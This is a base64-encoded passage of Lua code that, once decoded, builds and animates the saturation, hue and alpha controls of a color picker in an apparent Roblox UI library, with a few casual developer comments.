CAzOSwgMzkpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJzYXQiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInNhdHVyYXRpb25faG9sZGVyIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHQgPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0b0J1dHRvbkNvbG9yID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgWkluZGV4ID0gMjsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInNhdCIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDQpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUdyYWRpZW50IiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUm90YXRpb24gPSAyNzA7CiAgICAgICAgICAgICAgICAgICAgICAgIFRyYW5zcGFyZW5jeSA9IG51bXNlcXtudW1rZXkoMCwgMCksIG51bWtleSgxLCAxKX07CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAic2F0IiBdOwogICAgICAgICAgICAgICAgICAgICAgICBDb2xvciA9IHJnYnNlcXtyZ2JrZXkoMCwgcmdiKDAsIDAsIDApKSwgcmdia2V5KDEsIHJnYigwLCAwLCAwKSl9CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJ2YWwiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAic2F0dXJhdGlvbl9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJR3JhZGllbnQiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInZhbCIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgVHJhbnNwYXJlbmN5ID0gbnVtc2Vxe251bWtleSgwLCAwKSwgbnVta2V5KDEsIDEpfQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInZhbCIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDQpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAic2F0dXJhdGlvbl9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA0KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAic2F0dmFscGlja2VyIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0QnV0dG9uIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBBdXRvQnV0dG9uQ29sb3IgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICIiOwogICAgICAgICAgICAgICAgICAgICAgICBBbmNob3JQb2ludCA9IHZlYzIoMCwgMSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAic2F0dXJhdGlvbl9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgMCwgNCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDgsIDAsIDgpOwogICAgICAgICAgICAgICAgICAgICAgICBaSW5kZXggPSA1OwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMCwgMCkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJzYXR2YWxwaWNrZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA5OTk5KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlTdHJva2UiICwgewogICAgICAgICAgICAgICAgICAgICAgICBDb2xvciA9IHJnYigyNTUsIDI1NSwgMjU1KTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJzYXR2YWxwaWNrZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIEFwcGx5U3Ryb2tlTW9kZSA9IEVudW0uQXBwbHlTdHJva2VNb2RlLkJvcmRlcjsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImh1ZV9ncmFkaWVudCIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJ1dHRvbiIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiY29sb3JwaWNrZXJfY29tcG9uZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAxMCwgMSwgLTY0KTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMjAsIDAsIDgpOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpOwogICAgICAgICAgICAgICAgICAgICAgICBBdXRvQnV0dG9uQ29sb3IgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICIiOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlHcmFkaWVudCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIENvbG9yID0gcmdic2Vxe3JnYmtleSgwLCByZ2IoMjU1LCAwLCAwKSksIHJnYmtleSgwLjE3LCByZ2IoMjU1LCAyNTUsIDApKSwgcmdia2V5KDAuMzMsIHJnYigwLCAyNTUsIDApKSwgcmdia2V5KDAuNSwgcmdiKDAsIDI1NSwgMjU1KSksIHJnYmtleSgwLjY3LCByZ2IoMCwgMCwgMjU1KSksIHJnYmtleSgwLjgzLCByZ2IoMjU1LCAwLCAyNTUpKSwgcmdia2V5KDEsIHJnYigyNTUsIDAsIDApKX07CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiaHVlX2dyYWRpZW50IiBdCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiaHVlX2dyYWRpZW50IiBdOwogICAgICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgNikKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImh1ZV9waWNrZXIiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9CdXR0b25Db2xvciA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigwLCAwLjUpOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImh1ZV9ncmFkaWVudCIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAwLCAwLjUsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCA4LCAwLCA4KTsKICAgICAgICAgICAgICAgICAgICAgICAgWkluZGV4ID0gNTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDAsIDApCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiaHVlX3BpY2tlciIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDk5OTkpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVN0cm9rZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIENvbG9yID0gcmdiKDI1NSwgMjU1LCAyNTUpOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImh1ZV9waWNrZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIEFwcGx5U3Ryb2tlTW9kZSA9IEVudW0uQXBwbHlTdHJva2VNb2RlLkJvcmRlcjsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImFscGhhX2dyYWRpZW50IiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0QnV0dG9uIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJjb2xvcnBpY2tlcl9jb21wb25lbnRzIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDEwLCAxLCAtNDYpOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0yMCwgMCwgOCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjUsIDI1LCAyOSk7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9CdXR0b25Db2xvciA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiYWxwaGFfZ3JhZGllbnQiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA2KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAiYWxwaGFfcGlja2VyIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0QnV0dG9uIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBBdXRvQnV0dG9uQ29sb3IgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICIiOwogICAgICAgICAgICAgICAgICAgICAgICBBbmNob3JQb2ludCA9IHZlYzIoMCwgMC41KTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJhbHBoYV9ncmFkaWVudCIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigxLCAwLCAwLjUsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCA4LCAwLCA4KTsKICAgICAgICAgICAgICAgICAgICAgICAgWkluZGV4ID0gNTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDAsIDApCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiYWxwaGFfcGlja2VyIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgOTk5OSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJU3Ryb2tlIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgQ29sb3IgPSByZ2IoMjU1LCAyNTUsIDI1NSk7CiAgICAgICAgICAgICAgICAgICAgICAgIEFwcGx5U3Ryb2tlTW9kZSA9IEVudW0uQXBwbHlTdHJva2VNb2RlLkJvcmRlcjsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJhbHBoYV9waWNrZXIiIF0KICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJR3JhZGllbnQiICwgewogICAgICAgICAgICAgICAgICAgICAgICBDb2xvciA9IHJnYnNlcXtyZ2JrZXkoMCwgcmdiKDAsIDAsIDApKSwgcmdia2V5KDEsIHJnYigyNTUsIDI1NSwgMjU1KSl9OwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImFscGhhX2dyYWRpZW50IiBdCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJhbHBoYV9pbmRpY2F0b3IiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkltYWdlTGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgICAgICBTY2FsZVR5cGUgPSBFbnVtLlNjYWxlVHlwZS5UaWxlOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiYWxwaGFfZ3JhZGllbnQiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIEltYWdlID0gInJieGFzc2V0aWQ6Ly8xODI3NDQ1MjQ0OSI7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFRpbGVTaXplID0gZGltMigwLCA2LCAwLCA2KTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigwLCAwLCAwKQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlHcmFkaWVudCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIENvbG9yID0gcmdic2Vxe3JnYmtleSgwLCByZ2IoMTEyLCAxMTIsIDExMikpLCByZ2JrZXkoMSwgcmdiKDI1NSwgMCwgMCkpfTsKICAgICAgICAgICAgICAgICAgICAgICAgVHJhbnNwYXJlbmN5ID0gbnVtc2Vxe251bWtleSgwLCAwLjgwNjI0OTk3NjE1ODE0MjEpLCBudW1rZXkoMSwgMCl9OwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImFscGhhX2luZGljYXRvciIgXQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImFscGhhX2luZGljYXRvciIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDYpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUdyYWRpZW50IiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUm90YXRpb24gPSA5MDsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJjb2xvcnBpY2tlcl9jb21wb25lbnRzIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBDb2xvciA9IHJnYnNlcXtyZ2JrZXkoMCwgcmdiKDI1NSwgMjU1LCAyNTUpKSwgcmdia2V5KDEsIHJnYig2NiwgNjYsIDY2KSl9CiAgICAgICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAiaW5wdXQiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCb3giICwgewogICAgICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLmZvbnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigxLCAxKTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICIiOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImNvbG9ycGlja2VyX2NvbXBvbmVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0VHJ1bmNhdGUgPSBFbnVtLlRleHRUcnVuY2F0ZS5BdEVuZDsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgUGxhY2Vob2xkZXJDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSk7CiAgICAgICAgICAgICAgICAgICAgICAgIEN1cnNvclBvc2l0aW9uID0gLTE7CiAgICAgICAgICAgICAgICAgICAgICAgIENsZWFyVGV4dE9uRm9jdXMgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYig3MiwgNzIsIDcyKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMSwgLTgsIDEsIC0xMSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0xNiwgMCwgMTgpOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDMzLCAzMywgMzUpCiAgICAgICAgICAgICAgICAgICAgfSk7IAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImlucHV0IiBdOwogICAgICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgMykKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgIlVJQ29yZW5yIiBdID0gbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7IC0tIGZpcmUgbWlzc3R5cG8gKGltIG5vdCBmaXhpbmcgdGhpcyBSQVdSKQogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImNvbG9ycGlja2VyX2hvbGRlciIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA0KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgLS0gICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgZW5kOwoKICAgICAgICAgICAgZnVuY3Rpb24gY2ZnLnNldF92aXNpYmxlKGJvb2wpCiAgICAgICAgICAgICAgICBpdGVtc1sgImNvbG9ycGlja2VyX2ZhZGUiIF0uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAKICAgICAgICAgICAgICAgIGl0ZW1zWyAiY29sb3JwaWNrZXJfaG9sZGVyIiBdLlBhcmVudCA9IGJvb2wgYW5kIGxpYnJhcnlbICJpdGVtcyIgXSBvciBsaWJyYXJ5WyAib3RoZXIiIF0KICAgICAgICAgICAgICAgIGl0ZW1zWyAiY29sb3JwaWNrZXJfaG9sZGVyIiBdLlBvc2l0aW9uID0gZGltX29mZnNldChpdGVtc1sgImNvbG9ycGlja2VyIiBdLkFic29sdXRlUG9zaXRpb24uWCwgaXRlbXNbICJjb2xvcnBpY2tlciIgXS5BYnNvbHV0ZVBvc2l0aW9uLlkgKyBpdGVtc1sgImNvbG9ycGlja2VyIiBdLkFic29sdXRlU2l6ZS5ZICsgNDUpCgogICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgImNvbG9ycGlja2VyX2ZhZGUiIF0sIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMX0sIEVudW0uRWFzaW5nU3R5bGUuUXVhZCwgMC40KQogICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgImNvbG9ycGlja2VyX2hvbGRlciIgXSwge1Bvc2l0aW9uID0gaXRlbXNbICJjb2xvcnBpY2tlcl9ob2xkZXIiIF0uUG9zaXRpb24gKyBkaW1fb2Zmc2V0KDAsIDIwKX0pIC0tIHAxMDAgY2hlY2sKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgbm90IChzZWxmLnNhbml0eSBhbmQgbGlicmFyeS5jdXJyZW50X29wZW4gPT0gc2VsZiBhbmQgc2VsZi5vcGVuKSB0aGVuIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y2xvc2VfZWxlbWVudChjZmcpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBmdW5jdGlvbiBjZmcuc2V0KGNvbG9yLCBhbHBoYSkKICAgICAgICAgICAgICAgIGlmIHR5cGUoY29sb3IpID09ICJib29sZWFuIiB0aGVuIAogICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgICAgIGlmIGNvbG9yIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgaCwgcywgdiA9IGNvbG9yOlRvSFNWKCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBhbHBoYSB0aGVuIAogICAgICAgICAgICAgICAgICAgIGEgPSBhbHBoYQogICAgICAgICAgICAgICAgZW5kIAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBDb2xvciA9IGhzdihoLCBzLCB2KQoKICAgICAgICAgICAgICAgIC0tIE9rIHNvIHF1aWNrIHN0b3J5LCBzaG91bGQgSSBjYWNoZSBhbnkgb2YgdGhpcz8gbm8uLi4/PyBhbnl3YXlzIEkga25vdyB0aGlzIGNvZGUgaXMgdmVyeSBiYWQgYnV0IGl0cyB5b3VyIGZhdWx0IGZvciBidXlpbmcgYSB1aSB3aXRoIGFuaW1hdGlvbnMgKG9uIGEgc2VyaW91cyBub3RlIGltIHRvbyBsYXp5IHRvIG1ha2UgdGhpcyBsb29rIG5pY2UpCiAgICAgICAgICAgICAgICAtLSBBbHNvIGZ1cnRoZXIgbm90ZSwgeWVhaCBJIGtpbmQgb2YgZGlkIHRoaXMgc2NhbGVfZmFjdG9yICogc2l6ZS12YWx1ZXNpemUucGxhbmUgYmVjYXVzZSB0aGVuIEkgd291bGQgaGF2ZSB0byBkbyB0b21mb29sZXJ5IHRvIG1ha2UgaXQgY2xpcCBwcm9wZXJseS4KICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJodWVfcGlja2VyIiBdLCB7UG9zaXRpb24gPSBkaW0yKDAsIChpdGVtc1sgImh1ZV9ncmFkaWVudCIgXS5BYnNvbHV0ZVNpemUuWCAtIGl0ZW1zWyAiaHVlX3BpY2tlciIgXS5BYnNvbHV0ZVNpemUuWCkgKiBoLCAwLjUsIDApfSwgRW51bS5FYXNpbmdTdHlsZS5MaW5lYXIsIDAuMDUpCiAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAiYWxwaGFfcGlja2VyIiBdLCB7UG9zaXRpb24gPSBkaW0yKDAsIChpdGVtc1sgImFscGhhX2dyYWRpZW50IiBdLkFic29sdXRlU2l6ZS5YIC0gaXRlbXNbICJhbHBoYV9waWNrZXIiIF0uQWJzb2x1dGVTaXplLlgpICogKDEgLSBhKSwgMC41LCAwKX0sIEVudW0uRWFzaW5nU3R5bGUuTGluZWFyLCAwLjA1KQogICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgInNhdHZhbHBpY